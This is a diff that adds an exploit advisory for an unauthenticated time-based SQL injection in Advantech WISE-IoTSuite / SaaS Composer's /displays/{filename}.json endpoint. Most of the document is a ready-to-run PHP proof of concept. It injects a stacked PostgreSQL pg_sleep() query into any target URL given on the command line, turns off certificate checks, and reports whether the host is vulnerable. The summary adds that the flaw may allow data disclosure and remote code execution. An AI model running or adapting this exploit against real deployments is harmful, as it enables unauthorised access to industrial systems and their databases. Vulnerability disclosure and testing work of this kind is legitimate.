@@ -1,0 +1,100 @@
+=============================================================================================================================================
+| # Title     : Advantech IoTSuite / IoT Edge Products SaaS Composer – Unauthenticated Time-Based SQL Injection                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.advantech.com/en                                                                                                |
+=============================================================================================================================================
+
+[+] References : 
+
+[+] Summary    : A critical unauthenticated SQL injection vulnerability was identified in Advantech WISE-IoTSuite / SaaS Composer.
+                 The issue resides in the /displays/{filename}.json endpoint, where the filename parameter is improperly sanitized before being concatenated into a backend PostgreSQL query.
+                 An attacker can exploit this flaw by injecting stacked SQL queries, such as a time-based payload using pg_sleep(), to confirm successful query execution.
+                 This vulnerability may allow database enumeration, sensitive data disclosure, and under certain configurations, could potentially lead to remote code execution depending on database privileges.
+                 The vulnerability can be exploited remotely without authentication, posing a significant security risk to affected deployments.
+
+[+] POC :
+
+<?php
+
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
+
+$SLEEP_TIME = 10;
+$TIMEOUT    = 15;
+
+function build_payload_path($org_id, $sleep_time) {
+    return "/displays/filename.json'; select pg_sleep(" . $sleep_time . ") --?org_id=" . $org_id;
+}
+
+function test_vulnerability($base_url, $org_id, $sleep_time, $timeout) {
+
+    if (!preg_match('#^https?://#', $base_url)) {
+        $base_url = "https://" . $base_url;
+    }
+
+    $payload = build_payload_path($org_id, $sleep_time);
+    $target  = rtrim($base_url, '/') . $payload;
+
+    echo "[+] Target URL : {$base_url}\n";
+    echo "[+] Injecting  : org_id={$org_id}\n";
+    echo "[+] Payload    : {$payload}\n";
+    echo "[+] Full URL   : {$target}\n";
+    echo "----------------------------------------------------\n";
+
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL            => $target,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_TIMEOUT        => $timeout
+    ]);
+
+    $start = microtime(true);
+    curl_exec($ch);
+    $error = curl_error($ch);
+    curl_close($ch);
+
+    if ($error) {
+        echo "[!] ERROR: {$error}\n";
+        exit(3);
+    }
+
+    $duration = microtime(true) - $start;
+    printf("[*] Response time: %.2f seconds\n", $duration);
+
+    if ($duration >= $sleep_time) {
+        echo "\n=== RESULT: VULNERABLE ===\n";
+        echo "[+] Time-based SQL injection confirmed.\n";
+        echo "[+] PostgreSQL pg_sleep() executed.\n";
+        echo "[+] Further impact depends on DB privileges.\n";
+        exit(0);
+    } else {
+        echo "\n=== RESULT: NOT VULNERABLE ===\n";
+        echo "[-] No significant delay detected.\n";
+        exit(1);
+    }
+}
+
+$options = getopt("", ["url:", "org::"]);
+
+if (!isset($options["url"])) {
+    echo "Usage: php advantech_sqli_poc.php --url https://target --org 1\n";
+    exit(1);
+}
+
+$org_id = isset($options["org"]) ? (int)$options["org"] : 1;
+
+echo "==========================================================\n";
+echo " Advantech SaaS Composer - SQL Injection PoC by indoushka\n";
+echo "==========================================================\n";
+echo "[*] Using org_id = {$org_id}\n\n";
+
+test_vulnerability($options["url"], $org_id, $SLEEP_TIME, $TIMEOUT);
+
+
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
